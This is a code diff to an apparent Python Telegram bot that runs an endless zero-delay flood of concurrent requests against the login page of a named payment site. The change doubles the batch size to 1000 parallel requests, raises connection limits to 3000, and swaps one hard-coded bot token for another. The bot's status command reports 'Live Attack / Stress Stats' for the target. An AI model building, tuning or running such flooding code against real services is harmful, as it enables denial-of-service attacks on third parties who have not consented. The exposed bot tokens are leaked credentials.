@@ -6,7 +6,7 @@ from telebot.async_telebot import AsyncTeleBot
 # ==========================================
 # CONFIGURATION
 # ==========================================
-BOT_TOKEN = "8643292970:AAEW9cE9Qsm4zLdvyO1xEFWvhKdFBFhex68"  
+BOT_TOKEN = "8607797493:AAFjRgGRpHRmKoQBBoWzCP7TQxa2QqncZC8"  
 TARGET_URL = "https://www.elitepay.co.in/login"
 DOMAIN = "www.elitepay.co.in"
 
@@ -66,10 +66,10 @@ async def fire_request(session):
         stats["last_status"] = "ERR"
         stats["last_preview"] = str(e)[:40]
 
-# High-Speed Infinite Loop (Zero Sleep) with Massive Concurrency
+# High-Speed Infinite Loop (Zero Sleep) with 1000 Concurrency
 async def continuous_flood_worker():
-    batch_size = 500  # Ek sath 500 requests parallel fire hongi
-    connector = aiohttp.TCPConnector(limit=2000, limit_per_host=2000)
+    batch_size = 1000  # Ek sath 1000 requests parallel fire hongi
+    connector = aiohttp.TCPConnector(limit=3000, limit_per_host=3000)
     
     async with aiohttp.ClientSession(connector=connector) as session:
         while True:
@@ -81,9 +81,9 @@ async def continuous_flood_worker():
 @bot.message_handler(commands=['start'])
 async def handle_start(message):
     welcome_text = (
-        "⚡ **ElitePay Stress Test Bot Running**[span_1](start_span)[span_1](end_span)\n\n"
+        "⚡ **ElitePay Stress Test Bot Running (1000 Concurrency)**\n\n"
         "Commands:\n"
-        "➔ `/status` - Live request count aur response check karne ke liye.[span_2](start_span)"[span_2](end_span)
+        "➔ `/status` - Live request count aur response check karne ke liye."
     )
     await bot.reply_to(message, welcome_text, parse_mode='Markdown')
 
@@ -91,22 +91,22 @@ async def handle_start(message):
 @bot.message_handler(commands=['status'])
 async def handle_status(message):
     status_text = (
-        "📊 **Live Attack / Stress Stats**[span_3](start_span)[span_3](end_span)\n\n"
+        "📊 **Live Attack / Stress Stats**\n\n"
         f"🎯 **Target:** `elitepay.co.in/login`\n"
-        f"🚀 **Total Hits Sent:** `{stats['total_sent']}`[span_4](start_span)[span_4](end_span)\n"
-        f"✅ **Success (200):** `{stats['success_200']}`[span_5](start_span)[span_5](end_span)\n"
-        f"🚫 **Rate-Limited (429):** `{stats['rate_limited_429']}`[span_6](start_span)[span_6](end_span)\n"
-        f"⚠️ **Errors/Other:** `{stats['other_errors']}`[span_7](start_span)[span_7](end_span)\n\n"
-        f"📡 **Last Status:** `{stats['last_status']}`[span_8](start_span)[span_8](end_span)\n"
-        f"📝 **Latest Response:** `{stats['last_preview']}`[span_9](start_span)"[span_9](end_span)
+        f"🚀 **Total Hits Sent:** `{stats['total_sent']}`\n"
+        f"✅ **Success (200):** `{stats['success_200']}`\n"
+        f"🚫 **Rate-Limited (429):** `{stats['rate_limited_429']}`\n"
+        f"⚠️ **Errors/Other:** `{stats['other_errors']}`\n\n"
+        f"📡 **Last Status:** `{stats['last_status']}`\n"
+        f"📝 **Latest Response:** `{stats['last_preview']}`"
     )
     await bot.reply_to(message, status_text, parse_mode='Markdown')
 
 async def main():
-    print("Zero-Delay Continuous Loop Started on Railway...")[span_10](start_span)[span_10](end_span)
-    asyncio.create_task(continuous_flood_worker())[span_11](start_span)[span_11](end_span)
-    await bot.polling(non_stop=True)[span_12](start_span)[span_12](end_span)
+    print("Zero-Delay Continuous Loop (1000 Concurrency) Started on Railway...")
+    asyncio.create_task(continuous_flood_worker())
+    await bot.polling(non_stop=True)
 
 if __name__ == "__main__":
-    asyncio.run(main())[span_13](start_span)[span_13](end_span)
+    asyncio.run(main())
     
